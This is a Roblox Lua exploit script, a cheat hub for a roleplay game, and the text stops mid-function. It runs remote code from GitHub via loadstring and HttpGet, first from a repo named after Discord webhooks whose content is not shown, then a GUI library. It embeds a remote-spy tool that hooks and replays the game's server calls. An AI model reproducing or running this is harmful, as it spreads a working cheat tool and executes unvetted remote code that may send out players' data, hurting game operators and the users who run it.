loadstring(game:HttpGet(("https://raw.githubusercontent.com/GODMODs132/WebHook-Discord-Roblox/main/Script.lua"),true))()

-- Define the allowed PlaceGameID
local allowedPlaceGameID = 12691580008 -- Replace with your own PlaceGameID

-- Get the user's PlaceGameID
local placeGameID = game.PlaceId

-- Check if the user's PlaceGameID matches the allowed ID
if placeGameID == allowedPlaceGameID then
    print("SVEN CITY ROLEPLAY")
else
    -- If the user's PlaceGameID doesn't match the allowed ID, kick them
    game.Players.LocalPlayer:Kick("Banned | Reason: Cheating")
end

------------------------------------------------------------------------------------------

local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/peatchXD/Build-A-Boat-For-Treasure/main/GUI"))() 
local Window = Library.CreateLib("SVEN CITY ROLEPLAY | NONAME HUB 4.0 (Beta)", "DarkTheme")

------------------------------------------------------------------------------------------

local Tab = Window:NewTab("Admin")
local Section = Tab:NewSection("Simple SPY")
Section:NewButton("Click", " ",function()
    if _G.SimpleSpyExecuted and type(_G.SimpleSpyShutdown) == "function" then
        print(pcall(_G.SimpleSpyShutdown))
    end
    
    local Players = game:GetService("Players")
    local CoreGui = game:GetService("CoreGui")
    local Highlight =
        loadstring(
            game:HttpGet("https://raw.githubusercontent.com/peatchXD/Build-A-Boat-For-Treasure/main/Highlight.lua")
        )()
    
    local SimpleSpy2 = Instance.new("ScreenGui")
    local Background = Instance.new("Frame")
    local LeftPanel = Instance.new("Frame")
    local LogList = Instance.new("ScrollingFrame")
    local UIListLayout = Instance.new("UIListLayout")
    local RemoteTemplate = Instance.new("Frame")
    local ColorBar = Instance.new("Frame")
    local Text = Instance.new("TextLabel")
    local Button = Instance.new("TextButton")
    local RightPanel = Instance.new("Frame")
    local CodeBox = Instance.new("Frame")
    local ScrollingFrame = Instance.new("ScrollingFrame")
    local UIGridLayout = Instance.new("UIGridLayout")
    local FunctionTemplate = Instance.new("Frame")
    local ColorBar_2 = Instance.new("Frame")
    local Text_2 = Instance.new("TextLabel")
    local Button_2 = Instance.new("TextButton")
    local TopBar = Instance.new("Frame")
    local Simple = Instance.new("TextButton")
    local CloseButton = Instance.new("TextButton")
    local ImageLabel = Instance.new("ImageLabel")
    local MaximizeButton = Instance.new("TextButton")
    local ImageLabel_2 = Instance.new("ImageLabel")
    local MinimizeButton = Instance.new("TextButton")
    local ImageLabel_3 = Instance.new("ImageLabel")
    local ToolTip = Instance.new("Frame")
    local TextLabel = Instance.new("TextLabel")
    
    --Properties:
    
    SimpleSpy2.Name = "SimpleSpy2"
    SimpleSpy2.ResetOnSpawn = false
    
    Background.Name = "Background"
    Background.Parent = SimpleSpy2
    Background.BackgroundColor3 = Color3.new(1, 1, 1)
    Background.BackgroundTransparency = 1
    Background.Position = UDim2.new(0, 500, 0, 200)
    Background.Size = UDim2.new(0, 450, 0, 268)
    
    LeftPanel.Name = "LeftPanel"
    LeftPanel.Parent = Background
    LeftPanel.BackgroundColor3 = Color3.fromRGB(53, 52, 55)
    LeftPanel.BorderSizePixel = 0
    LeftPanel.Position = UDim2.new(0, 0, 0, 19)
    LeftPanel.Size = UDim2.new(0, 131, 0, 249)
    
    LogList.Name = "LogList"
    LogList.Parent = LeftPanel
    LogList.Active = true
    LogList.BackgroundColor3 = Color3.new(1, 1, 1)
    LogList.BackgroundTransparency = 1
    LogList.BorderSizePixel = 0
    LogList.Position = UDim2.new(0, 0, 0, 9)
    LogList.Size = UDim2.new(0, 131, 0, 232)
    LogList.CanvasSize = UDim2.new(0, 0, 0, 0)
    LogList.ScrollBarThickness = 4
    
    UIListLayout.Parent = LogList
    UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
    
    RemoteTemplate.Name = "RemoteTemplate"
    RemoteTemplate.Parent = LogList
    RemoteTemplate.BackgroundColor3 = Color3.new(1, 1, 1)
    RemoteTemplate.BackgroundTransparency = 1
    RemoteTemplate.Size = UDim2.new(0, 117, 0, 27)
    
    ColorBar.Name = "ColorBar"
    ColorBar.Parent = RemoteTemplate
    ColorBar.BackgroundColor3 = Color3.fromRGB(255, 242, 0)
    ColorBar.BorderSizePixel = 0
    ColorBar.Position = UDim2.new(0, 0, 0, 1)
    ColorBar.Size = UDim2.new(0, 7, 0, 18)
    ColorBar.ZIndex = 2
    
    Text.Name = "Text"
    Text.Parent = RemoteTemplate
    Text.BackgroundColor3 = Color3.new(1, 1, 1)
    Text.BackgroundTransparency = 1
    Text.Position = UDim2.new(0, 12, 0, 1)
    Text.Size = UDim2.new(0, 105, 0, 18)
    Text.ZIndex = 2
    Text.Font = Enum.Font.SourceSans
    Text.Text = "TEXT"
    Text.TextColor3 = Color3.new(1, 1, 1)
    Text.TextSize = 14
    Text.TextXAlignment = Enum.TextXAlignment.Left
    Text.TextWrapped = true
    
    Button.Name = "Button"
    Button.Parent = RemoteTemplate
    Button.BackgroundColor3 = Color3.new(0, 0, 0)
    Button.BackgroundTransparency = 0.75
    Button.BorderColor3 = Color3.new(1, 1, 1)
    Button.Position = UDim2.new(0, 0, 0, 1)
    Button.Size = UDim2.new(0, 117, 0, 18)
    Button.AutoButtonColor = false
    Button.Font = Enum.Font.SourceSans
    Button.Text = ""
    Button.TextColor3 = Color3.new(0, 0, 0)
    Button.TextSize = 14
    
    RightPanel.Name = "RightPanel"
    RightPanel.Parent = Background
    RightPanel.BackgroundColor3 = Color3.fromRGB(37, 36, 38)
    RightPanel.BorderSizePixel = 0
    RightPanel.Position = UDim2.new(0, 131, 0, 19)
    RightPanel.Size = UDim2.new(0, 319, 0, 249)
    
    CodeBox.Name = "CodeBox"
    CodeBox.Parent = RightPanel
    CodeBox.BackgroundColor3 = Color3.new(0.0823529, 0.0745098, 0.0784314)
    CodeBox.BorderSizePixel = 0
    CodeBox.Size = UDim2.new(0, 319, 0, 119)
    
    ScrollingFrame.Parent = RightPanel
    ScrollingFrame.Active = true
    ScrollingFrame.BackgroundColor3 = Color3.new(1, 1, 1)
    ScrollingFrame.BackgroundTransparency = 1
    ScrollingFrame.Position = UDim2.new(0, 0, 0.5, 0)
    ScrollingFrame.Size = UDim2.new(1, 0, 0.5, -9)
    ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
    ScrollingFrame.ScrollBarThickness = 4
    
    UIGridLayout.Parent = ScrollingFrame
    UIGridLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
    UIGridLayout.CellPadding = UDim2.new(0, 0, 0, 0)
    UIGridLayout.CellSize = UDim2.new(0, 94, 0, 27)
    
    FunctionTemplate.Name = "FunctionTemplate"
    FunctionTemplate.Parent = ScrollingFrame
    FunctionTemplate.BackgroundColor3 = Color3.new(1, 1, 1)
    FunctionTemplate.BackgroundTransparency = 1
    FunctionTemplate.Size = UDim2.new(0, 117, 0, 23)
    
    ColorBar_2.Name = "ColorBar"
    ColorBar_2.Parent = FunctionTemplate
    ColorBar_2.BackgroundColor3 = Color3.new(1, 1, 1)
    ColorBar_2.BorderSizePixel = 0
    ColorBar_2.Position = UDim2.new(0, 7, 0, 10)
    ColorBar_2.Size = UDim2.new(0, 7, 0, 18)
    ColorBar_2.ZIndex = 3
    
    Text_2.Name = "Text"
    Text_2.Parent = FunctionTemplate
    Text_2.BackgroundColor3 = Color3.new(1, 1, 1)
    Text_2.BackgroundTransparency = 1
    Text_2.Position = UDim2.new(0, 19, 0, 10)
    Text_2.Size = UDim2.new(0, 69, 0, 18)
    Text_2.ZIndex = 2
    Text_2.Font = Enum.Font.SourceSans
    Text_2.Text = "TEXT"
    Text_2.TextColor3 = Color3.new(1, 1, 1)
    Text_2.TextSize = 14
    Text_2.TextStrokeColor3 = Color3.new(0.145098, 0.141176, 0.14902)
    Text_2.TextXAlignment = Enum.TextXAlignment.Left
    Text_2.TextWrapped = true
    
    Button_2.Name = "Button"
    Button_2.Parent = FunctionTemplate
    Button_2.BackgroundColor3 = Color3.new(0, 0, 0)
    Button_2.BackgroundTransparency = 0.69999998807907
    Button_2.BorderColor3 = Color3.new(1, 1, 1)
    Button_2.Position = UDim2.new(0, 7, 0, 10)
    Button_2.Size = UDim2.new(0, 80, 0, 18)
    Button_2.AutoButtonColor = false
    Button_2.Font = Enum.Font.SourceSans
    Button_2.Text = ""
    Button_2.TextColor3 = Color3.new(0, 0, 0)
    Button_2.TextSize = 14
    
    TopBar.Name = "TopBar"
    TopBar.Parent = Background
    TopBar.BackgroundColor3 = Color3.fromRGB(37, 35, 38)
    TopBar.BorderSizePixel = 0
    TopBar.Size = UDim2.new(0, 450, 0, 19)
    
    Simple.Name = "Simple"
    Simple.Parent = TopBar
    Simple.BackgroundColor3 = Color3.new(1, 1, 1)
    Simple.AutoButtonColor = false
    Simple.BackgroundTransparency = 1
    Simple.Position = UDim2.new(0, 5, 0, 0)
    Simple.Size = UDim2.new(0, 57, 0, 18)
    Simple.Font = Enum.Font.SourceSansBold
    Simple.Text = "SimpleSpy"
    Simple.TextColor3 = Color3.new(1, 1, 1)
    Simple.TextSize = 14
    Simple.TextXAlignment = Enum.TextXAlignment.Left
    
    CloseButton.Name = "CloseButton"
    CloseButton.Parent = TopBar
    CloseButton.BackgroundColor3 = Color3.new(0.145098, 0.141176, 0.14902)
    CloseButton.BorderSizePixel = 0
    CloseButton.Position = UDim2.new(1, -19, 0, 0)
    CloseButton.Size = UDim2.new(0, 19, 0, 19)
    CloseButton.Font = Enum.Font.SourceSans
    CloseButton.Text = ""
    CloseButton.TextColor3 = Color3.new(0, 0, 0)
    CloseButton.TextSize = 14
    
    ImageLabel.Parent = CloseButton
    ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
    ImageLabel.BackgroundTransparency = 1
    ImageLabel.Position = UDim2.new(0, 5, 0, 5)
    ImageLabel.Size = UDim2.new(0, 9, 0, 9)
    ImageLabel.Image = "http://www.roblox.com/asset/?id=5597086202"
    
    MaximizeButton.Name = "MaximizeButton"
    MaximizeButton.Parent = TopBar
    MaximizeButton.BackgroundColor3 = Color3.new(0.145098, 0.141176, 0.14902)
    MaximizeButton.BorderSizePixel = 0
    MaximizeButton.Position = UDim2.new(1, -38, 0, 0)
    MaximizeButton.Size = UDim2.new(0, 19, 0, 19)
    MaximizeButton.Font = Enum.Font.SourceSans
    MaximizeButton.Text = ""
    MaximizeButton.TextColor3 = Color3.new(0, 0, 0)
    MaximizeButton.TextSize = 14
    
    ImageLabel_2.Parent = MaximizeButton
    ImageLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
    ImageLabel_2.BackgroundTransparency = 1
    ImageLabel_2.Position = UDim2.new(0, 5, 0, 5)
    ImageLabel_2.Size = UDim2.new(0, 9, 0, 9)
    ImageLabel_2.Image = "http://www.roblox.com/asset/?id=5597108117"
    
    MinimizeButton.Name = "MinimizeButton"
    MinimizeButton.Parent = TopBar
    MinimizeButton.BackgroundColor3 = Color3.new(0.145098, 0.141176, 0.14902)
    MinimizeButton.BorderSizePixel = 0
    MinimizeButton.Position = UDim2.new(1, -57, 0, 0)
    MinimizeButton.Size = UDim2.new(0, 19, 0, 19)
    MinimizeButton.Font = Enum.Font.SourceSans
    MinimizeButton.Text = ""
    MinimizeButton.TextColor3 = Color3.new(0, 0, 0)
    MinimizeButton.TextSize = 14
    
    ImageLabel_3.Parent = MinimizeButton
    ImageLabel_3.BackgroundColor3 = Color3.new(1, 1, 1)
    ImageLabel_3.BackgroundTransparency = 1
    ImageLabel_3.Position = UDim2.new(0, 5, 0, 5)
    ImageLabel_3.Size = UDim2.new(0, 9, 0, 9)
    ImageLabel_3.Image = "http://www.roblox.com/asset/?id=5597105827"
    
    ToolTip.Name = "ToolTip"
    ToolTip.Parent = SimpleSpy2
    ToolTip.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
    ToolTip.BackgroundTransparency = 0.1
    ToolTip.BorderColor3 = Color3.new(1, 1, 1)
    ToolTip.Size = UDim2.new(0, 200, 0, 50)
    ToolTip.ZIndex = 3
    ToolTip.Visible = false
    
    TextLabel.Parent = ToolTip
    TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
    TextLabel.BackgroundTransparency = 1
    TextLabel.Position = UDim2.new(0, 2, 0, 2)
    TextLabel.Size = UDim2.new(0, 196, 0, 46)
    TextLabel.ZIndex = 3
    TextLabel.Font = Enum.Font.SourceSans
    TextLabel.Text = "This is some slightly longer text."
    TextLabel.TextColor3 = Color3.new(1, 1, 1)
    TextLabel.TextSize = 14
    TextLabel.TextWrapped = true
    TextLabel.TextXAlignment = Enum.TextXAlignment.Left
    TextLabel.TextYAlignment = Enum.TextYAlignment.Top
    
    -------------------------------------------------------------------------------
    -- init
    local RunService = game:GetService("RunService")
    local UserInputService = game:GetService("UserInputService")
    local TweenService = game:GetService("TweenService")
    local ContentProvider = game:GetService("ContentProvider")
    local TextService = game:GetService("TextService")
    local Mouse
    
    local selectedColor = Color3.new(0.321569, 0.333333, 1)
    local deselectedColor = Color3.new(0.8, 0.8, 0.8)
    --- So things are descending
    local layoutOrderNum = 999999999
    --- Whether or not the gui is closing
    local mainClosing = false
    --- Whether or not the gui is closed (defaults to false)
    local closed = false
    --- Whether or not the sidebar is closing
    local sideClosing = false
    --- Whether or not the sidebar is closed (defaults to true but opens automatically on remote selection)
    local sideClosed = false
    --- Whether or not the code box is maximized (defaults to false)
    local maximized = false
    --- The event logs to be read from
    local logs = {}
    --- The event currently selected.Log (defaults to nil)
    local selected = nil
    --- The blacklist (can be a string name or the Remote Instance)
    local blacklist = {}
    --- The block list (can be a string name or the Remote Instance)
    local blocklist = {}
    --- Whether or not to add getNil function
    local getNil = false
    --- Array of remotes (and original functions) connected to
    local connectedRemotes = {}
    --- True = hookfunction, false = namecall
    local toggle = false
    local gm
    local original
    --- used to prevent recursives
    local prevTables = {}
    --- holds logs (for deletion)
    local remoteLogs = {}
    --- used for hookfunction
    local remoteEvent = Instance.new("RemoteEvent")
    --- used for hookfunction
    local remoteFunction = Instance.new("RemoteFunction")
    local originalEvent = remoteEvent.FireServer
    local originalFunction = remoteFunction.InvokeServer
    --- the maximum amount of remotes allowed in logs
    _G.SIMPLESPYCONFIG_MaxRemotes = 500
    --- how many spaces to indent
    local indent = 4
    --- used for task scheduler
    local scheduled = {}
    --- RBXScriptConnect of the task scheduler
    local schedulerconnect
    local SimpleSpy = {}
    local topstr = ""
    local bottomstr = ""
    local remotesFadeIn
    local rightFadeIn
    local codebox
    local p
    local getnilrequired = false
    
    -- autoblock variables
    local autoblock = false
    local history = {}
    local excluding = {}
    
    -- function info variables
    local funcEnabled = true
    
    -- remote hooking/connecting api variables
    local remoteSignals = {}
    local remoteHooks = {}
    
    -- original mouse icon
    local oldIcon
    
    -- if mouse inside gui
    local mouseInGui = false
    
    -- handy array of RBXScriptConnections to disconnect on shutdown
    local connections = {}
    
    -- whether or not SimpleSpy uses 'getcallingscript()' to get the script (default is false because detection)
    local useGetCallingScript = false
    
    --- used to enable/disable SimpleSpy's keyToString for remotes
    local keyToString = false
    
    -- determines whether return values are recorded
    local recordReturnValues = false
    
    -- functions
    
    --- Converts arguments to a string and generates code that calls the specified method with them, recommended to be used in conjunction with ValueToString (method must be a string, e.g. `game:GetService("ReplicatedStorage").Remote.remote:FireServer`)
    --- @param method string
    --- @param args any[]
    --- @return string
    function SimpleSpy:ArgsToString(method, args)
        assert(typeof(method) == "string", "string expected, got " .. typeof(method))
        assert(typeof(args) == "table", "table expected, got " .. typeof(args))
        return v2v({ args = args }) .. "\n\n" .. method .. "(unpack(args))"
    end
    
    --- Converts a value to variables with the specified index as the variable name (if nil/invalid then the name will be assigned automatically)
    --- @param t any[]
    --- @return string
    function SimpleSpy:TableToVars(t)
        assert(typeof(t) == "table", "table expected, got " .. typeof(t))
        return v2v(t)
    end
    
    --- Converts a value to a variable with the specified `variablename` (if nil/invalid then the name will be assigned automatically)
    --- @param value any
    --- @return string
    function SimpleSpy:ValueToVar(value, variablename)
        assert(variablename == nil or typeof(variablename) == "string", "string expected, got " .. typeof(variablename))
        if not variablename then
            variablename = 1
        end
        return v2v({ [variablename] = value })
    end
    
    --- Converts any value to a string, cannot preserve function contents
    --- @param value any
    --- @return string
    function SimpleSpy:ValueToString(value)
        return v2s(value)
    end
    
    --- Generates the simplespy function info
    --- @param func function
    --- @return string
    function SimpleSpy:GetFunctionInfo(func)
        assert(typeof(func) == "function", "Instance expected, got " .. typeof(func))
        warn("Function info currently unavailable due to crashing in Synapse X")
        return v2v({ functionInfo = {
            info = debug.getinfo(func),
            constants = debug.getconstants(func),
        } })
    end
    
    --- Gets the ScriptSignal for a specified remote being fired
    --- @param remote Instance
    function SimpleSpy:GetRemoteFiredSignal(remote)
        assert(typeof(remote) == "Instance", "Instance expected, got " .. typeof(remote))
        if not remoteSignals[remote] then
            remoteSignals[remote] = newSignal()
        end
        return remoteSignals[remote]
    end
    
    --- Allows for direct hooking of remotes **THIS CAN BE VERY DANGEROUS**
    --- @param remote Instance
    --- @param f function
    function SimpleSpy:HookRemote(remote, f)
        assert(typeof(remote) == "Instance", "Instance expected, got " .. typeof(remote))
        assert(typeof(f) == "function", "function expected, got " .. typeof(f))
        remoteHooks[remote] = f
    end
    
    --- Blocks the specified remote instance/string
    --- @param remote any
    function SimpleSpy:BlockRemote(remote)
        assert(
            typeof(remote) == "Instance" or typeof(remote) == "string",
            "Instance | string expected, got " .. typeof(remote)
        )
        blocklist[remote] = true
    end
    
    --- Excludes the specified remote from logs (instance/string)
    --- @param remote any
    function SimpleSpy:ExcludeRemote(remote)
        assert(
            typeof(remote) == "Instance" or typeof(remote) == "string",
            "Instance | string expected, got " .. typeof(remote)
        )
        blacklist[remote] = true
    end
    
    --- Creates a new ScriptSignal that can be connected to and fired
    --- @return table
    function newSignal()
        local connected = {}
        return {
            Connect = function(self, f)
                assert(connected, "Signal is closed")
                connected[tostring(f)] = f
                return {
                    Connected = true,
                    Disconnect = function(self)
                        if not connected then
                            warn("Signal is already closed")
                        end
                        self.Connected = false
                        connected[tostring(f)] = nil
                    end,
                }
            end,
            Wait = function(self)
                local thread = coroutine.running()
                local connection
                connection = self:Connect(function()
                    connection:Disconnect()
                    if coroutine.status(thread) == "suspended" then
                        coroutine.resume(thread)
                    end
                end)
                coroutine.yield()
            end,
            Fire = function(self, ...)
                for _, f in pairs(connected) do
                    coroutine.wrap(f)(...)
                end
            end,
        }
    end
    
    --- Prevents remote spam from causing lag (clears logs after `_G.SIMPLESPYCONFIG_MaxRemotes` or 500 remotes)
    function clean()
        local max = _G.SIMPLESPYCONFIG_MaxRemotes
        if not typeof(max) == "number" and math.floor(max) ~= max then
            max = 500
        end
        if #remoteLogs > max then
            for i = 100, #remoteLogs do
                local v = remoteLogs[i]
                if typeof(v[1]) == "RBXScriptConnection" then
                    v[1]:Disconnect()
                end
                if typeof(v[2]) == "Instance" then
                    v[2]:Destroy()
                end
            end
            local newLogs = {}
            for i = 1, 100 do
                table.insert(newLogs, remoteLogs[i])
            end
            remoteLogs = newLogs
        end
    end
    
    --- Scales the ToolTip to fit containing text
    function scaleToolTip()
        local size = TextService:GetTextSize(
            TextLabel.Text,
            TextLabel.TextSize,
            TextLabel.Font,
            Vector2.new(196, math.huge)
        )
        TextLabel.Size = UDim2.new(0, size.X, 0, size.Y)
        ToolTip.Size = UDim2.new(0, size.X + 4, 0, size.Y + 4)
    end
    
    --- Executed when the toggle button (the SimpleSpy logo) is hovered over
    function onToggleButtonHover()
        if not toggle then
            TweenService:Create(Simple, TweenInfo.new(0.5), { TextColor3 = Color3.fromRGB(252, 51, 51) }):Play()
        else
            TweenService:Create(Simple, TweenInfo.new(0.5), { TextColor3 = Color3.fromRGB(68, 206, 91) }):Play()
        end
    end
    
    --- Executed when the toggle button is unhovered over
    function onToggleButtonUnhover()
        TweenService:Create(Simple, TweenInfo.new(0.5), { TextColor3 = Color3.fromRGB(255, 255, 255) }):Play()
    end
    
    --- Executed when the X button is hovered over
    function onXButtonHover()
        TweenService:Create(CloseButton, TweenInfo.new(0.2), { BackgroundColor3 = Color3.fromRGB(255, 60, 60) }):Play()
    end
    
    --- Executed when the X button is unhovered over
    function onXButtonUnhover()
        TweenService:Create(CloseButton, TweenInfo.new(0.2), { BackgroundColor3 = Color3.fromRGB(37, 36, 38) }):Play()
    end
    
    --- Toggles the remote spy method (when button clicked)
    function onToggleButtonClick()
        if toggle then
            TweenService:Create(Simple, TweenInfo.new(0.5), { TextColor3 = Color3.fromRGB(252, 51, 51) }):Play()
        else
            TweenService:Create(Simple, TweenInfo.new(0.5), { TextColor3 = Color3.fromRGB(68, 206, 91) }):Play()
        end
        toggleSpyMethod()
    end
    
    --- Reconnects bringBackOnResize if the current viewport changes and also connects it initially
    function connectResize()
        local lastCam = workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(bringBackOnResize)
        workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
            lastCam:Disconnect()
            if workspace.CurrentCamera then
                lastCam = workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(bringBackOnResize)
            end
        end)
    end
    
    --- Brings gui back if it gets lost offscreen (connected to the camera viewport changing)
    function bringBackOnResize()
        validateSize()
        if sideClosed then
            minimizeSize()
        else
            maximizeSize()
        end
        local currentX = Background.AbsolutePosition.X
        local currentY = Background.AbsolutePosition.Y
        local viewportSize = workspace.CurrentCamera.ViewportSize
        if (currentX < 0) or (currentX > (viewportSize.X - (sideClosed and 131 or Background.AbsoluteSize.X))) then
            if currentX < 0 then
                currentX = 0
            else
                currentX = viewportSize.X - (sideClosed and 131 or Background.AbsoluteSize.X)
            end
        end
        if (currentY < 0) or (currentY > (viewportSize.Y - (closed and 19 or Background.AbsoluteSize.Y) - 36)) then
            if currentY < 0 then
                currentY = 0
            else
                currentY = viewportSize.Y - (closed and 19 or Background.AbsoluteSize.Y) - 36
            end
        end
        TweenService.Create(
            TweenService,
            Background,
            TweenInfo.new(0.1),
            { Position = UDim2.new(0, currentX, 0, currentY) }
        ):Play()
    end
    
    --- Drags gui (so long as mouse is held down)
    --- @param input InputObject
    function onBarInput(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            local lastPos = UserInputService.GetMouseLocation(UserInputService)
            local mainPos = Background.AbsolutePosition
            local offset = mainPos - lastPos
            local currentPos = offset + lastPos
            RunService.BindToRenderStep(RunService, "drag", 1, function()
                local newPos = UserInputService.GetMouseLocation(UserInputService)
                if newPos ~= lastPos then
                    local currentX = (offset + newPos).X
                    local currentY = (offset + newPos).Y
                    local viewportSize = workspace.CurrentCamera.ViewportSize
                    if
                        (currentX < 0 and currentX < currentPos.X)
                        or (
                            currentX > (viewportSize.X - (sideClosed and 131 or TopBar.AbsoluteSize.X))
                            and currentX > currentPos.X
                        )
                    then
                        if currentX < 0 then
                            currentX = 0
                        else
                            currentX = viewportSize.X - (sideClosed and 131 or TopBar.AbsoluteSize.X)
                        end
                    end
                    if
                        (currentY < 0 and currentY < currentPos.Y)
                        or (
                            currentY > (viewportSize.Y - (closed and 19 or Background.AbsoluteSize.Y) - 36)
                            and currentY > currentPos.Y
                        )
                    then
                        if currentY < 0 then
                            currentY = 0
                        else
                            currentY = viewportSize.Y - (closed and 19 or Background.AbsoluteSize.Y) - 36
                        end
                    end
                    currentPos = Vector2.new(currentX, currentY)
                    lastPos = newPos
                    TweenService.Create(
                        TweenService,
                        Background,
                        TweenInfo.new(0.1),
                        { Position = UDim2.new(0, currentPos.X, 0, currentPos.Y) }
                    ):Play()
                end
                -- if input.UserInputState ~= Enum.UserInputState.Begin then
                --     RunService.UnbindFromRenderStep(RunService, "drag")
                -- end
            end)
            table.insert(
                connections,
                UserInputService.InputEnded:Connect(function(inputE)
                    if input == inputE then
                        RunService:UnbindFromRenderStep("drag")
                    end
                end)
            )
        end
    end
    
    --- Fades out the table of elements (and makes them invisible), returns a function to make them visible again
    function fadeOut(elements)
        local data = {}
        for _, v in pairs(elements) do
            if typeof(v) == "Instance" and v:IsA("GuiObject") and v.Visible then
                coroutine.wrap(function()
                    data[v] = {
                        BackgroundTransparency = v.BackgroundTransparency,
                    }
                    TweenService:Create(v, TweenInfo.new(0.5), { BackgroundTransparency = 1 }):Play()
                    if v:IsA("TextBox") or v:IsA("TextButton") or v:IsA("TextLabel") then
                        data[v].TextTransparency = v.TextTransparency
                        TweenService:Create(v, TweenInfo.new(0.5), { TextTransparency = 1 }):Play()
                    elseif v:IsA("ImageButton") or v:IsA("ImageLabel") then
                        data[v].ImageTransparency = v.ImageTransparency
                        TweenService:Create(v, TweenInfo.new(0.5), { ImageTransparency = 1 }):Play()
                    end
                    wait(0.5)
                    v.Visible = false
                    for i, x in pairs(data[v]) do
                        v[i] = x
                    end
                    data[v] = true
                end)()
            end
        end
        return function()
            for i, _ in pairs(data) do
                coroutine.wrap(function()
                    local properties = {
                        BackgroundTransparency = i.BackgroundTransparency,
                    }
                    i.BackgroundTransparency = 1
                    TweenService
                        :Create(i, TweenInfo.new(0.5), { BackgroundTransparency = properties.BackgroundTransparency })
                        :Play()
                    if i:IsA("TextBox") or i:IsA("TextButton") or i:IsA("TextLabel") then
                        properties.TextTransparency = i.TextTransparency
                        i.TextTransparency = 1
                        TweenService
                            :Create(i, TweenInfo.new(0.5), { TextTransparency = properties.TextTransparency })
                            :Play()
                    elseif i:IsA("ImageButton") or i:IsA("ImageLabel") then
                        properties.ImageTransparency = i.ImageTransparency
                        i.ImageTransparency = 1
                        TweenService
                            :Create(i, TweenInfo.new(0.5), { ImageTransparency = properties.ImageTransparency })
                            :Play()
                    end
                    i.Visible = true
                end)()
            end
        end
    end
    
    --- Expands and minimizes the gui (closed is the toggle boolean)
    function toggleMinimize(override)
        if mainClosing and not override or maximized then
            return
        end
        mainClosing = true
        closed = not closed
        if closed then
            if not sideClosed then
                toggleSideTray(true)
            end
            LeftPanel.Visible = true
            TweenService:Create(LeftPanel, TweenInfo.new(0.5), { Size = UDim2.new(0, 131, 0, 0) }):Play()
            wait(0.5)
            remotesFadeIn = fadeOut(LeftPanel:GetDescendants())
            wait(0.5)
        else
            TweenService:Create(LeftPanel, TweenInfo.new(0.5), { Size = UDim2.new(0, 131, 0, 249) }):Play()
            wait(0.5)
            if remotesFadeIn then
                remotesFadeIn()
                remotesFadeIn = nil
            end
            bringBackOnResize()
        end
        mainClosing = false
    end
    
    --- Expands and minimizes the sidebar (sideClosed is the toggle boolean)
    function toggleSideTray(override)
        if sideClosing and not override or maximized then
            return
        end
        sideClosing = true
        sideClosed = not sideClosed
        if sideClosed then
            rightFadeIn = fadeOut(RightPanel:GetDescendants())
            wait(0.5)
            minimizeSize(0.5)
            wait(0.5)
            RightPanel.Visible = false
        else
            if closed then
                toggleMinimize(true)
            end
            RightPanel.Visible = true
            maximizeSize(0.5)
            wait(0.5)
            if rightFadeIn then
                rightFadeIn()
            end
            bringBackOnResize()
        end
        sideClosing = false
    end
    
    --- Expands code box to fit screen for more convenient viewing
    function toggleMaximize()
        if not sideClosed and not maximized then
            maximized = true
            local disable = Instance.new("TextButton")
            local prevSize = UDim2.new(0, CodeBox.AbsoluteSize.X, 0, CodeBox.AbsoluteSize.Y)
            local prevPos = UDim2.new(0, CodeBox.AbsolutePosition.X, 0, CodeBox.AbsolutePosition.Y)
            disable.Size = UDim2.new(1, 0, 1, 0)
            disable.BackgroundColor3 = Color3.new()
            disable.BorderSizePixel = 0
            disable.Text = 0
            disable.ZIndex = 3
            disable.BackgroundTransparency = 1
            disable.AutoButtonColor = false
            CodeBox.ZIndex = 4
            CodeBox.Position = prevPos
            CodeBox.Size = prevSize
            TweenService
                :Create(
                    CodeBox,
                    TweenInfo.new(0.5),
                    { Size = UDim2.new(0.5, 0, 0.5, 0), Position = UDim2.new(0.25, 0, 0.25, 0) }
                )
                :Play()
            TweenService:Create(disable, TweenInfo.new(0.5), { BackgroundTransparency = 0.5 }):Play()
            disable.MouseButton1Click:Connect(function()
                if
                    UserInputService:GetMouseLocation().Y + 36 >= CodeBox.AbsolutePosition.Y
                    and UserInputService:GetMouseLocation().Y + 36 <= CodeBox.AbsolutePosition.Y + CodeBox.AbsoluteSize.Y
                    and UserInputService:GetMouseLocation().X >= CodeBox.AbsolutePosition.X
                    and UserInputService:GetMouseLocation().X <= CodeBox.AbsolutePosition.X + CodeBox.AbsoluteSize.X
                then
                    return
                end
                TweenService:Create(CodeBox, TweenInfo.new(0.5), { Size = prevSize, Position = prevPos }):Play()
                TweenService:Create(disable, TweenInfo.new(0.5), { BackgroundTransparency = 1 }):Play()
                maximized = false
                wait(0.5)
                disable:Destroy()
                CodeBox.Size = UDim2.new(1, 0, 0.5, 0)
                CodeBox.Position = UDim2.new(0, 0, 0, 0)
                CodeBox.ZIndex = 0
            end)
        end
    end
    
    --- Checks if cursor is within resize range
    --- @param p Vector2
    function isInResizeRange(p)
        local relativeP = p - Background.AbsolutePosition
        local range = 5
        if
            relativeP.X >= TopBar.AbsoluteSize.X - range
            and relativeP.Y >= Background.AbsoluteSize.Y - range
            and relativeP.X <= TopBar.AbsoluteSize.X
            and relativeP.Y <= Background.AbsoluteSize.Y
        then
            return true, "B"
        elseif relativeP.X >= TopBar.AbsoluteSize.X - range and relativeP.X <= Background.AbsoluteSize.X then
            return true, "X"
        elseif relativeP.Y >= Background.AbsoluteSize.Y - range and relativeP.Y <= Background.AbsoluteSize.Y then
            return true, "Y"
        end
        return false
    end
    
    --- Checks if cursor is within dragging range
    --- @param p Vector2
    function isInDragRange(p)
        local relativeP = p - Background.AbsolutePosition
        if
            relativeP.X <= TopBar.AbsoluteSize.X - CloseButton.AbsoluteSize.X * 3
            and relativeP.X >= 0
            and relativeP.Y <= TopBar.AbsoluteSize.Y
